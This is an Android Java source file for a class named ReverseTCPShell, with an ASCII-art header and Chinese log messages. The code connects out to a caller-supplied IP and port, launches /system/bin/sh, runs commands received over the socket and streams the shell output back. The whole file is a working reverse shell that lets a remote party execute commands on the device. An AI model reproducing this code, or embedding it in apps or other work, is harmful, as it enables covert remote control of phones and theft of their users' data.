import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;

/**
 * Created by LongYH on 2017/6/7.
 * #     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   #
 * #                       _oo0oo_                     #
 * #                      o8888888o                    #
 * #                      88" . "88                    #
 * #                      (| -_- |)                    #
 * #                      0\  =  /0                    #
 * #                    ___/`---'\___                  #
 * #                  .' \\|     |# '.                 #
 * #                 / \\|||  :  |||# \                #
 * #                / _||||| -:- |||||- \              #
 * #               |   | \\\  -  #/ |   |              #
 * #               | \_|  ''\---/''  |_/ |             #
 * #               \  .-\__  '-'  ___/-. /             #
 * #             ___'. .'  /--.--\  `. .'___           #
 * #          ."" '<  `.___\_<|>_/___.' >' "".         #
 * #         | | :  `- \`.;`\ _ /`;.`/ - ` : | |       #
 * #         \  \ `_.   \_ __\ /__ _/   .-` /  /       #
 * #     =====`-.____`.___ \_____/___.-`___.-'=====    #
 * #                       `=---='                     #
 * #     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   #
 * #                                                   #
 * #               佛祖保佑         永无BUG            #
 * #                                                   #
 */

public class ReverseTCPShell {
    private static final String TAG = ReverseTCPShell.class.getSimpleName();
    private static final int ERROR = -1;
    private static final int CONNECTED = 1;
    private static final int RECEIVE = 2;
    private static final int FEEDBACK = 3;
    private static final int STOP = 4;

    private boolean alive = true;
    private String ip;
    private int port;
    private Socket socket;
    private PrintWriter socketWriter;
    private BufferedReader socketReader;
    private ConnectErrorListener errorListener;
    private ConnectListener connectListener;

    private Handler handler;
    private HandlerThread feedBackThread;//反馈本地内容线程
    private HandlerThread receiveThread;//读取tcp命令线程

    private PrintWriter commandWriter;
    private BufferedReader commandReader;
    private BufferedReader errorReader;

    private ReverseTCPShell() {
        super();
    }

    private ReverseTCPShell(String ip, int port) {
        this();
        this.ip = ip;
        this.port = port;
    }

    public static void connect(String ip, int port, ConnectListener connectListener, final ConnectErrorListener errorListener) {
        final ReverseTCPShell tcpShell = new ReverseTCPShell(ip, port);
        tcpShell.errorListener = errorListener;
        tcpShell.connectListener = connectListener;
        tcpShell.handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                switch (msg.what) {
                    case ERROR:
                        tcpShell.errorListener.error(msg.obj.toString());
                        break;
                    case CONNECTED:
                        //开启监听
                        tcpShell.startFeedBackThread();
                        tcpShell.startReceiveThread();
                        tcpShell.connectListener.connected(tcpShell);
                        break;
                    case RECEIVE:
                        tcpShell.connectListener.receiveMessage(msg.obj.toString());
                        break;
                    case FEEDBACK:
                        tcpShell.connectListener.feedbackMessage(msg.obj.toString());
                        break;
                    case STOP:
                        tcpShell.connectListener.stopped();
                        break;
                }
            }
        };
        tcpShell.connect();
    }


    private void connect() {
        new Thread(){
            @Override
            public void run() {
                Log.d(TAG, "尝试连接服务器:" + ip + ":" + port);
                try {
                    socket = new Socket(ip, port);
                    socketWriter = new PrintWriter(socket.getOutputStream(), true);
                    socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    socketWriter.println("---Connection has been established---");
                    socketWriter.flush();
                    Log.d(TAG, "与服务器连接成功");
                    Message msg = Message.obtain();
                    msg.what = CONNECTED;
                    handler.sendMessage(msg);
                } catch (IOException e) {
                    e.printStackTrace();
                    Message msg = Message.obtain();
                    msg.what = ERROR;
                    msg.obj = e.getMessage();
                    handler.sendMessage(msg);
                }
            }
        }.start();
    }

    private void startFeedBackThread(){
        feedBackThread = new HandlerThread("feedback"){
            @Override
            public void run() {
                try {
                    Runtime rt = Runtime.getRuntime();
                    Process p = rt.exec("/system/bin/sh");

                    InputStream IS = p.getInputStream();
                    OutputStream OS = p.getOutputStream();
                    InputStream ES = p.getErrorStream();
                    commandWriter = new PrintWriter(OS);
                    commandReader = new BufferedReader(new InputStreamReader(IS));
                    errorReader = new BufferedReader(new InputStreamReader(ES));

                    String line, error = null;
                    while ((line = commandReader.readLine()) != null || (error = errorReader.readLine()) != null) {
                        socketWriter.println(line);
                        socketWriter.println(error);
                        socketWriter.flush();
                        Message msg = Message.obtain();
                        msg.what = FEEDBACK;
                        msg.obj = line + error;
                        handler.sendMessage(msg);
                    }

                    p.destroy();
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    connectStopped();
                }
            }
        };
        feedBackThread.start();
    }

    public void startReceiveThread() {
        receiveThread = new HandlerThread("receive"){
            @Override
            public void run() {
                String receive;
                try {
                    while ((receive = socketReader.readLine()) != null && alive) {
                        if (commandWriter != null) {
                            commandWriter.println(receive);
                            commandWriter.flush();
                            Message msg = Message.obtain();
                            msg.what = RECEIVE;
                            msg.obj = receive;
                            handler.sendMessage(msg);
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }finally {
                    connectStopped();
                }
            }
        };
        receiveThread.start();
    }


    private void connectStopped(){
        try {
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Message msg = Message.obtain();
        msg.what = STOP;
        handler.sendMessage(msg);
    }


    synchronized public void stop(){
        connectStopped();
        handler.removeMessages(RECEIVE);
        handler.removeMessages(FEEDBACK);
        handler.removeMessages(ERROR);
        handler.removeMessages(CONNECTED);
        this.alive = false;
        feedBackThread.quit();
        receiveThread.quit();

    }

}
